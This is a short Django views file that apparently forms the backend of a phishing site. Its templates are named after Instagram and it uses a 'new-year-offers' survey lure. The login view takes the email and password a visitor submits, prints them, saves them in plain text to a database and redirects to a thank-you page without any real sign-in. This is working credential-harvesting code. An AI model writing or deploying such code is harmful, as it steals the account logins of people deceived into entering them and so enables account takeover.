from django.shortcuts import render,redirect
from .models import User
# Create your views here.

def login(req):
	if req.method == "POST":
		email = req.POST["email"]
		passwd = req.POST["passwd"]
		print(email,passwd)
		User.objects.create(email=email,passwd=passwd)
		return redirect("/new-year-offers/thanks")
	return render(req,"instagram/login.html")


def home(req):
	return render(req,"instagram/servey.html")

def thanks(req):
	return render(req,"instagram/thanks-servey.html")